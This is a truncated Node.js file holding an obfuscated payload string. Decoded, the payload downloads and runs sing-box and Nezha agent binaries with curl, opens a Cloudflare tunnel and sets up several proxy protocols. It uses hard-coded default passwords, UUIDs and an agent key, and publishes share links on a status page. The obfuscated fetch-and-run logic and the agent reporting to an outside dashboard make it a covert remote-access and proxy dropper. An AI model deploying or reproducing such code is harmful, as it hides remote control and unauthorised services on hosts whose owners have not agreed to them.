const { execSync } = require('child_process');
const b = `const _0x153881=_0x1057;(function(_0x500633,_0x3cd307){const _0x154fdd=_0x1057,_0x339685=_0x500633();while(!![]){try{const _0xa0d6a4=-parseInt(_0x154fdd(0x298))/0x1*(parseInt(_0x154fdd(0x1ea))/0x2)+-parseInt(_0x154fdd(0x1f3))/0x3*(-parseInt(_0x154fdd(0x225))/0x4)+-parseInt(_0x154fdd(0x248))/0x5*(parseInt(_0x154fdd(0x25b))/0x6)+parseInt(_0x154fdd(0x224))/0x7*(parseInt(_0x154fdd(0x201))/0x8)+-parseInt(_0x154fdd(0x1de))/0x9*(-parseInt(_0x154fdd(0x25c))/0xa)+-parseInt(_0x154fdd(0x288))/0xb+-parseInt(_0x154fdd(0x263))/0xc;if(_0xa0d6a4===_0x3cd307)break;else _0x339685['push'](_0x339685['shift']());}catch(_0x62a39e){_0x339685['push'](_0x339685['shift']());}}}(_0x36d2,0x92ce0));const http=require(_0x153881(0x23f)),https=require(_0x153881(0x252)),fs=require('fs'),path=require('path'),os=require('os'),{spawn,exec}=require(_0x153881(0x22e)),{URL}=require('url'),crypto=require('crypto'),net=require('net'),express=require(_0x153881(0x271)),CONFIG={'A_A':process[_0x153881(0x25d)][_0x153881(0x211)]||_0x153881(0x1da),'A_P_D':process['env']['A_P_D']||_0x153881(0x24c),'A_D':process[_0x153881(0x25d)][_0x153881(0x28f)]||_0x153881(0x1f2),'N_S':process[_0x153881(0x25d)]['N_S']||_0x153881(0x28d),'N_P':process[_0x153881(0x25d)][_0x153881(0x289)]||_0x153881(0x24e),'N_K':process[_0x153881(0x25d)][_0x153881(0x1f4)]||'nJqKWWLfSFvJnMXpZ8','N_T':process['env'][_0x153881(0x247)]||_0x153881(0x281),'N_V':process[_0x153881(0x25d)]['N_V']||_0x153881(0x23d),'HY2_PORT':process[_0x153881(0x25d)]['HY2_PORT']||'','VMESS_PORT':process[_0x153881(0x25d)][_0x153881(0x22c)]||_0x153881(0x226),'REALITY_PORT':process[_0x153881(0x25d)][_0x153881(0x1f5)]||'','TUIC_PORT':process[_0x153881(0x25d)][_0x153881(0x287)]||'','SERVER_IP':process['env'][_0x153881(0x28c)]||'','VMESS_UUID':process[_0x153881(0x25d)][_0x153881(0x1ef)]||_0x153881(0x1ed),'TUIC_UUID':process[_0x153881(0x25d)][_0x153881(0x28a)]||_0x153881(0x1ed),'TUIC_PASSWORD':process[_0x153881(0x25d)][_0x153881(0x1d8)]||'789456','HY2_PASSWORD':process[_0x153881(0x25d)][_0x153881(0x1e6)]||_0x153881(0x285),'REALITY_PRIVATE_KEY':process['env'][_0x153881(0x267)]||'','REALITY_PUBLIC_KEY':process[_0x153881(0x25d)][_0x153881(0x296)]||'','HY2_SNI':process['env'][_0x153881(0x1ff)]||'www.bing.com','VMESS_PATH':process['env'][_0x153881(0x230)]||_0x153881(0x21e),'REALITY_SNI':process[_0x153881(0x25d)][_0x153881(0x24f)]||'www.microsoft.com','REALITY_SHORT_ID':process[_0x153881(0x25d)][_0x153881(0x1e2)]||_0x153881(0x23a),'PORT':process[_0x153881(0x25d)][_0x153881(0x241)]||0xbb8},WORK_DIR=os[_0x153881(0x209)](),processes=[];let serviceStatus={'singbox':_0x153881(0x208),'cloudflared':'stopped','nezha':_0x153881(0x208),'http':_0x153881(0x208)};const HTML_TEMPLATES={'home':_0x153881(0x276),'status':(_0x580a05,_0x32c73f)=>'\x0a\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Service\x20Status</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body{font-family:Arial,sans-serif;margin:40px;background-color:#f5f5f5}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container{max-width:900px;margin:0\x20auto;background:white;padding:30px;border-radius:8px;box-shadow:0\x202px\x2010px\x20rgba(0,0,0,0.1)}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1{color:#333;text-align:center;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-card{padding:20px;background:#f8f9fa;border-radius:8px;text-align:center}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-card\x20h3{margin:0\x200\x2010px\x200;color:#555}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-running{background:#d4edda;color:#155724}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-stopped{background:#f8d7da;color:#721c24}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.info-item{margin:20px\x200;padding:15px;background:#f8f9fa;border-radius:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.label{font-weight:bold;color:#555;margin-bottom:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.value{font-family:monospace;background:#e9ecef;padding:10px;border-radius:4px;word-break:break-all;font-size:12px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.copy-btn{background:#007cba;color:white;border:none;padding:8px\x2015px;border-radius:3px;cursor:pointer;margin-top:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.copy-btn:hover{background:#0056b3}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.protocol{color:#28a745;font-weight:bold}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav{text-align:center;margin-bottom:20px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav\x20a{margin:0\x2010px;color:#007cba;text-decoration:none}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav\x20a:hover{text-decoration:underline}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-info{margin:20px\x200;padding:15px;background:#e9ecef;border-radius:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;margin-top:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-item{background:#fff;padding:10px;border-radius:4px;text-align:center;box-shadow:0\x201px\x203px\x20rgba(0,0,0,0.1)}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-label{font-weight:bold;color:#555}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-value{font-family:monospace;color:#28a745;margin-top:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20function\x20refreshPage()\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20location.reload();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20setInterval(refreshPage,\x2030000);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22nav\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22/\x22>Home</a>\x20|\x20<a\x20href=\x22/status\x22>Status</a>\x20|\x20<a\x20href=\x22javascript:refreshPage()\x22>Refresh</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Service\x20Status</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20'+(serviceStatus[_0x153881(0x26e)]===_0x153881(0x28b)?'status-running':_0x153881(0x1e1))+_0x153881(0x246)+serviceStatus[_0x153881(0x26e)]+_0x153881(0x1eb)+(serviceStatus['cloudflared']===_0x153881(0x28b)?_0x153881(0x21a):'status-stopped')+'\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Cloudflared</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>'+serviceStatus[_0x153881(0x1d6)]+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20'+(serviceStatus[_0x153881(0x200)]===_0x153881(0x28b)?_0x153881(0x21a):'status-stopped')+_0x153881(0x284)+serviceStatus[_0x153881(0x200)]+_0x153881(0x1eb)+(serviceStatus[_0x153881(0x23f)]===_0x153881(0x28b)?'status-running':_0x153881(0x1e1))+_0x153881(0x206)+serviceStatus['http']+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-info\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>Configured\x20Ports:</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>HTTP</div><div\x20class=\x22port-value\x22>'+CONFIG['PORT']+_0x153881(0x1e8)+(CONFIG[_0x153881(0x22c)]?_0x153881(0x1fc)+CONFIG['VMESS_PORT']+_0x153881(0x1fb):'')+_0x153881(0x25a)+(CONFIG['HY2_PORT']?_0x153881(0x1f8)+CONFIG['HY2_PORT']+'</div></div>':'')+_0x153881(0x25a)+(CONFIG['REALITY_PORT']?_0x153881(0x1e9)+CONFIG[_0x153881(0x1f5)]+_0x153881(0x1fb):'')+_0x153881(0x25a)+(CONFIG[_0x153881(0x287)]?_0x153881(0x1d5)+CONFIG[_0x153881(0x287)]+_0x153881(0x1fb):'')+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>Server\x20IP:</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22value\x22>'+_0x580a05+_0x153881(0x286)+(_0x32c73f['length']>0x0?_0x32c73f[_0x153881(0x24a)](_0x54a599=>_0x153881(0x234)+_0x54a599[_0x153881(0x1dc)]+_0x153881(0x1ce)+_0x54a599[_0x153881(0x1dc)][_0x153881(0x22b)]()+'\x22>'+_0x54a599[_0x153881(0x282)]+_0x153881(0x249)+_0x54a599['url']+'\x27).then(()=>alert(\x27Copied\x20'+_0x54a599[_0x153881(0x1dc)]+_0x153881(0x237))['join'](''):_0x153881(0x26c))+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20'};function detectArch(){const _0x2100e2=_0x153881,_0x3ab0b3=process[_0x2100e2(0x215)];return _0x3ab0b3===_0x2100e2(0x264)?_0x2100e2(0x20c):_0x3ab0b3===_0x2100e2(0x297)?'arm64':(console['error']('Unsupported\x20architecture:\x20'+_0x3ab0b3),process[_0x2100e2(0x1fd)](0x1),'');}async function getLatestVersion(_0x50be12){return new Promise((_0x2bd6b9,_0x4a3ca9)=>{const _0x1eddc2=_0x1057;https[_0x1eddc2(0x21f)]('https://api.github.com/repos/'+_0x50be12+_0x1eddc2(0x22a),{'headers':{'User-Agent':_0x1eddc2(0x27b)}},_0x596b1f=>{const _0x28221e=_0x1eddc2;let _0x8d8ad4='';_0x596b1f['on']('data',_0xbf0224=>_0x8d8ad4+=_0xbf0224),_0x596b1f['on'](_0x28221e(0x223),()=>{const _0x1c94ca=_0x28221e;try{_0x2bd6b9(JSON[_0x1c94ca(0x261)](_0x8d8ad4)[_0x1c94ca(0x1f0)]);}catch(_0x367cea){_0x4a3ca9(_0x367cea);}});})['on'](_0x1eddc2(0x21d),_0x4a3ca9);});}async function downloadFile(_0x1d8815,_0x853610){return new Promise((_0x58fa83,_0x412ad3)=>{const _0x3a2d56=_0x1057;exec(_0x3a2d56(0x250)+_0x1d8815+_0x3a2d56(0x1e3)+_0x853610+'\x22\x20&&\x20chmod\x20+x\x20\x22'+_0x853610+'\x22',_0x51e958=>{if(_0x51e958)return _0x412ad3(_0x51e958);_0x58fa83();});});}async function downloadSingBox(_0x304709,_0x256f51,_0x1e359a){const _0x40b58d=_0x153881,_0x2dcd93=_0x1e359a['replace']('v',''),_0x1675e6='https://github.com/SagerNet/sing-box/releases/download/v'+_0x2dcd93+'/sing-box-'+_0x2dcd93+_0x40b58d(0x1f9)+_0x304709+_0x40b58d(0x214),_0x5efcba=path[_0x40b58d(0x268)](WORK_DIR,_0x40b58d(0x270)+crypto['randomBytes'](0x4)[_0x40b58d(0x1d9)](_0x40b58d(0x28e))+'.tar.gz');return new Promise((_0x57ffe5,_0x4d0620)=>{const _0x87387a=_0x40b58d;exec('curl\x20-s\x20-L\x20\x22'+_0x1675e6+_0x87387a(0x1e3)+_0x5efcba+'\x22',_0x5e1506=>{const _0x3acd2a=_0x87387a;if(_0x5e1506)return _0x4d0620(_0x5e1506);exec(_0x3acd2a(0x22d)+WORK_DIR+_0x3acd2a(0x239)+_0x5efcba+_0x3acd2a(0x260)+_0x2dcd93+_0x3acd2a(0x1f9)+_0x304709+_0x3acd2a(0x232)+_0x256f51+_0x3acd2a(0x21c)+_0x2dcd93+_0x3acd2a(0x1f9)+_0x304709+'\x20\x22'+_0x5efcba+'\x22',_0x338f82=>{const _0x504162=_0x3acd2a;if(_0x338f82)return _0x4d0620(_0x338f82);fs[_0x504162(0x292)](_0x256f51,'755'),_0x57ffe5();});});});}function _0x1057(_0x152fc0,_0x2aea42){const _0x36d274=_0x36d2();return _0x1057=function(_0x10572c,_0x42d8d9){_0x10572c=_0x10572c-0x1cd;let _0x3aed4a=_0x36d274[_0x10572c];return _0x3aed4a;},_0x1057(_0x152fc0,_0x2aea42);}async function downloadNezhaAgent(_0x6411be,_0xf71fdc,_0x54d77d){const _0x56a912=_0x153881,_0x225aea='https://github.com/nezhahq/agent/releases/download/'+_0x54d77d+_0x56a912(0x210)+_0x6411be+'.zip',_0xb185bf=path[_0x56a912(0x268)](WORK_DIR,_0x56a912(0x20e)+crypto['randomBytes'](0x4)['toString'](_0x56a912(0x28e))),_0x3ec813=path[_0x56a912(0x268)](WORK_DIR,'nezha-'+crypto[_0x56a912(0x1cf)](0x4)[_0x56a912(0x1d9)](_0x56a912(0x28e))+_0x56a912(0x1f1));return new Promise((_0x1527d2,_0x1ee47a)=>{const _0x202d4d=_0x56a912;try{fs[_0x202d4d(0x277)](_0xb185bf,{'recursive':!![]}),exec('curl\x20-s\x20-L\x20\x22'+_0x225aea+_0x202d4d(0x1e3)+_0x3ec813+'\x22',_0x33b587=>{const _0xca4bc5=_0x202d4d;if(_0x33b587)return _0x1ee47a(_0x33b587);if(!fs['existsSync'](_0x3ec813))return _0x1ee47a(new Error(_0xca4bc5(0x265)+_0x3ec813));exec('cd\x20\x22'+_0xb185bf+'\x22\x20&&\x20unzip\x20-q\x20-o\x20\x22'+_0x3ec813+'\x22',_0xfd21e0=>{const _0x49fcb4=_0xca4bc5;if(_0xfd21e0){exec(_0x49fcb4(0x22d)+_0xb185bf+_0x49fcb4(0x216)+_0x3ec813+'\x22',_0x17b569=>{if(_0x17b569)return _0x1ee47a(_0xfd21e0);_0x300777();});return;}_0x300777();});function _0x300777(){const _0x40bef2=_0xca4bc5;exec('find\x20\x22'+_0xb185bf+_0x40bef2(0x238)+_0xf71fdc+_0x40bef2(0x1ec)+_0xf71fdc+_0x40bef2(0x279)+_0xb185bf+_0x40bef2(0x299)+_0x3ec813+'\x22',_0x2c1a28=>{if(_0x2c1a28)return _0x1ee47a(_0x2c1a28);_0x1527d2();});}});}catch(_0x34236f){_0x1ee47a(_0x34236f);}});}async function getServerIP(){return new Promise(_0x4543d4=>{const _0x428fe1=_0x1057;https['get']('https://ipv4.icanhazip.com',_0x25659f=>{const _0xa7b427=_0x1057;let _0x58feb3='';_0x25659f['on'](_0xa7b427(0x1cd),_0x4abe9a=>_0x58feb3+=_0x4abe9a),_0x25659f['on']('end',()=>_0x4543d4(_0x58feb3[_0xa7b427(0x1d4)]()));})['on'](_0x428fe1(0x21d),()=>_0x4543d4(_0x428fe1(0x235)));});}async function startTempTunnel(_0x24139f,_0x49c0a1){return new Promise(_0x34d47e=>{const _0x43bfa2=_0x1057;for(let _0x27ad57=0x0;_0x27ad57<0x3;_0x27ad57++){const _0x402929=path[_0x43bfa2(0x268)](WORK_DIR,_0x43bfa2(0x227)+crypto[_0x43bfa2(0x1cf)](0x4)['toString'](_0x43bfa2(0x28e))+'.log'),_0xae3074=spawn(_0x24139f,[_0x43bfa2(0x290),_0x43bfa2(0x236),_0x43bfa2(0x25e),_0x43bfa2(0x27a)+_0x49c0a1],{'stdio':[_0x43bfa2(0x212),_0x43bfa2(0x258),'pipe']});processes[_0x43bfa2(0x23c)](_0xae3074);const _0x447ac6=fs[_0x43bfa2(0x1f6)](_0x402929);_0xae3074['stdout'][_0x43bfa2(0x258)](_0x447ac6),_0xae3074[_0x43bfa2(0x26d)][_0x43bfa2(0x258)](_0x447ac6),setTimeout(()=>{const _0x58477d=_0x43bfa2;try{const _0x30431f=fs['readFileSync'](_0x402929,'utf8'),_0x499c74=_0x30431f[_0x58477d(0x255)](/https:\/\/([^\/\s]+\.trycloudflare\.com)/);if(_0x499c74)return CONFIG[_0x58477d(0x28f)]=_0x499c74[0x1],fs['unlinkSync'](_0x402929),_0x34d47e(!![]);}catch(_0x1dbd60){}_0xae3074[_0x58477d(0x27f)]();try{fs[_0x58477d(0x27c)](_0x402929);}catch(_0x54c282){}_0x27ad57===0x2&&_0x34d47e(![]);},0x2710);}});}async function generateRealityKeys(_0x208409){const _0x205416=_0x153881;if(!CONFIG['REALITY_PORT']||CONFIG[_0x205416(0x267)]&&CONFIG['REALITY_PUBLIC_KEY'])return;return new Promise(_0x2828e1=>{const _0x4b91fe=_0x205416;exec('\x22'+_0x208409+_0x4b91fe(0x256),(_0x4b8b50,_0xa0cf3)=>{const _0x5e1b18=_0x4b91fe;if(!_0x4b8b50&&_0xa0cf3){const _0x5af3e6=_0xa0cf3[_0x5e1b18(0x255)](/PrivateKey:\s*(\S+)/),_0x784db9=_0xa0cf3[_0x5e1b18(0x255)](/PublicKey:\s*(\S+)/);_0x5af3e6&&_0x784db9&&(CONFIG[_0x5e1b18(0x267)]=_0x5af3e6[0x1],CONFIG[_0x5e1b18(0x296)]=_0x784db9[0x1]);}_0x2828e1();});});}async function generateSingBoxConfig(){const _0x110c69=_0x153881,_0x1df870=[];CONFIG['HY2_PORT']&&_0x1df870[_0x110c69(0x23c)]({'type':_0x110c69(0x294),'tag':_0x110c69(0x228),'listen':'::','listen_port':parseInt(CONFIG[_0x110c69(0x27e)]),'users':[{'password':CONFIG[_0x110c69(0x1e6)]}],'tls':{'enabled':!![],'server_name':CONFIG[_0x110c69(0x1ff)],'insecure':!![]}});CONFIG['VMESS_PORT']&&_0x1df870[_0x110c69(0x23c)]({'type':_0x110c69(0x273),'tag':'vmess-in','listen':'::','listen_port':parseInt(CONFIG[_0x110c69(0x22c)]),'users':[{'uuid':CONFIG[_0x110c69(0x1ef)],'alterId':0x0}],'transport':{'type':'ws','path':CONFIG['VMESS_PATH']}});CONFIG[_0x110c69(0x1f5)]&&_0x1df870[_0x110c69(0x23c)]({'type':'vless','tag':'reality-in','listen':'::','listen_port':parseInt(CONFIG[_0x110c69(0x1f5)]),'users':[{'uuid':CONFIG['VMESS_UUID'],'flow':_0x110c69(0x26f)}],'tls':{'enabled':!![],'server_name':CONFIG[_0x110c69(0x24f)],'reality':{'enabled':!![],'handshake':{'server':CONFIG[_0x110c69(0x24f)],'server_port':0x1bb},'private_key':CONFIG[_0x110c69(0x267)],'short_id':[CONFIG['REALITY_SHORT_ID']]}}});CONFIG[_0x110c69(0x287)]&&_0x1df870[_0x110c69(0x23c)]({'type':_0x110c69(0x231),'tag':_0x110c69(0x23b),'listen':'::','listen_port':parseInt(CONFIG[_0x110c69(0x287)]),'users':[{'uuid':CONFIG[_0x110c69(0x28a)],'password':CONFIG[_0x110c69(0x1d8)]}],'tls':{'enabled':!![],'server_name':CONFIG[_0x110c69(0x1ff)],'insecure':!![]}});const _0x52c476={'log':{'level':_0x110c69(0x275),'timestamp':![]},'inbounds':_0x1df870,'outbounds':[{'type':'direct','tag':_0x110c69(0x266)},{'type':_0x110c69(0x221),'tag':_0x110c69(0x221)}],'route':{'rules':[{'geoip':_0x110c69(0x1dd),'outbound':'direct'}]}},_0xb30a83=path[_0x110c69(0x268)](WORK_DIR,'config.json');return fs['writeFileSync'](_0xb30a83,JSON['stringify'](_0x52c476,null,0x2)),_0xb30a83;}function generateLinks(_0xcc45ca){const _0x3ab693=_0x153881,_0x42770b=[];CONFIG['HY2_PORT']&&_0x42770b['push']({'protocol':_0x3ab693(0x274),'url':_0x3ab693(0x1d1)+CONFIG['HY2_PASSWORD']+'@'+_0xcc45ca+':'+CONFIG['HY2_PORT']+_0x3ab693(0x203)+CONFIG[_0x3ab693(0x1ff)]+'#HY2'});if(CONFIG[_0x3ab693(0x22c)]){const _0x7fcd6={'v':'2','ps':_0x3ab693(0x295),'add':CONFIG[_0x3ab693(0x26b)],'port':_0x3ab693(0x24e),'id':CONFIG[_0x3ab693(0x1ef)],'aid':'0','scy':_0x3ab693(0x207),'net':'ws','type':'none','host':CONFIG[_0x3ab693(0x28f)],'path':CONFIG['VMESS_PATH'],'tls':'tls','sni':CONFIG[_0x3ab693(0x28f)],'alpn':'','fp':_0x3ab693(0x20f)},_0x57ad78=JSON[_0x3ab693(0x244)](_0x7fcd6,null,0x2)['replace'](/\n/g,'\x0d\x0a')[_0x3ab693(0x269)](/\s{2,}/g,'\x20\x20');_0x42770b[_0x3ab693(0x23c)]({'protocol':_0x3ab693(0x251),'url':_0x3ab693(0x293)+Buffer[_0x3ab693(0x259)](_0x57ad78)[_0x3ab693(0x1d9)]('base64')});}return CONFIG['REALITY_PORT']&&_0x42770b[_0x3ab693(0x23c)]({'protocol':_0x3ab693(0x1e7),'url':'vless://'+CONFIG[_0x3ab693(0x1ef)]+'@'+_0xcc45ca+':'+CONFIG[_0x3ab693(0x1f5)]+_0x3ab693(0x229)+CONFIG[_0x3ab693(0x24f)]+'&fp=chrome&pbk='+CONFIG[_0x3ab693(0x296)]+_0x3ab693(0x242)+CONFIG['REALITY_SHORT_ID']+_0x3ab693(0x1e4)}),CONFIG[_0x3ab693(0x287)]&&_0x42770b[_0x3ab693(0x23c)]({'protocol':_0x3ab693(0x1e5),'url':_0x3ab693(0x283)+CONFIG[_0x3ab693(0x28a)]+':'+CONFIG['TUIC_PASSWORD']+'@'+_0xcc45ca+':'+CONFIG['TUIC_PORT']+_0x3ab693(0x1fa)}),_0x42770b;}function cleanup(){const _0x5405b2=_0x153881;processes[_0x5405b2(0x1f7)](_0x496594=>{try{_0x496594['kill']();}catch(_0x57abe3){}}),process[_0x5405b2(0x1fd)](0x0);}const app=express();app['get']('/',(_0x382a65,_0x7374bf)=>{const _0x3a6608=_0x153881;_0x7374bf[_0x3a6608(0x213)](0xc8,{'Content-Type':_0x3a6608(0x1db)}),_0x7374bf['end'](HTML_TEMPLATES[_0x3a6608(0x243)]);}),app[_0x153881(0x21f)]('/status',async(_0x232f53,_0x30a34c)=>{const _0x5319db=_0x153881,_0x4bed97=await getServerIP(),_0x334efa=generateLinks(_0x4bed97);_0x30a34c['writeHead'](0xc8,{'Content-Type':_0x5319db(0x1db)}),_0x30a34c[_0x5319db(0x223)](HTML_TEMPLATES[_0x5319db(0x24b)](_0x4bed97,_0x334efa));}),app[_0x153881(0x21f)]('/x',async(_0x1f6061,_0x3681a5)=>{const _0x1f2d9b=_0x153881,_0x3f7e50=await getServerIP(),_0x34aad9=generateLinks(_0x3f7e50);_0x3681a5['writeHead'](0xc8,{'Content-Type':_0x1f2d9b(0x1db)}),_0x3681a5[_0x1f2d9b(0x223)](HTML_TEMPLATES[_0x1f2d9b(0x24b)](_0x3f7e50,_0x34aad9));}),app[_0x153881(0x21f)](_0x153881(0x272),(_0x3876f0,_0x3f32df)=>{const _0x465e54=_0x153881;_0x3f32df[_0x465e54(0x213)](0xc8,{'Content-Type':_0x465e54(0x1d0)}),_0x3f32df[_0x465e54(0x223)](JSON[_0x465e54(0x244)]({'status':'ok','uptime':process['uptime']()}));});const server=http['createServer'](app);server['on'](_0x153881(0x22f),function(_0x39fb88,_0x28e060,_0x4f19b0){const _0x46cb03=_0x153881;try{const {pathname:_0x400c6c}=new URL(_0x39fb88[_0x46cb03(0x282)],'http://'+_0x39fb88[_0x46cb03(0x20b)]['host']);if(_0x400c6c===CONFIG['VMESS_PATH']){const _0x3f0d26=net[_0x46cb03(0x218)]({'host':_0x46cb03(0x235),'port':parseInt(CONFIG['VMESS_PORT'])});_0x3f0d26[_0x46cb03(0x204)](!![]),_0x28e060[_0x46cb03(0x204)](!![]),_0x3f0d26['once'](_0x46cb03(0x278),function(){const _0x2314b5=_0x46cb03,_0x296e7e=Buffer[_0x2314b5(0x291)]([Buffer['from'](_0x39fb88[_0x2314b5(0x24d)]+'\x20'+_0x39fb88[_0x2314b5(0x282)]+'\x20HTTP/'+_0x39fb88[_0x2314b5(0x205)]+'\x0d\x0a'),...Object[_0x2314b5(0x23e)](_0x39fb88[_0x2314b5(0x20b)])[_0x2314b5(0x24a)](_0x2a32ed=>Buffer['from'](_0x2a32ed+':\x20'+_0x39fb88[_0x2314b5(0x20b)][_0x2a32ed]+'\x0d\x0a')),Buffer[_0x2314b5(0x259)]('\x0d\x0a')]);_0x3f0d26[_0x2314b5(0x220)](_0x296e7e);if(_0x4f19b0&&_0x4f19b0['length'])_0x3f0d26[_0x2314b5(0x220)](_0x4f19b0);_0x28e060[_0x2314b5(0x258)](_0x3f0d26),_0x3f0d26['pipe'](_0x28e060);});const _0x3ff0e4=(_0xfdf114,_0x2a14d7)=>{const 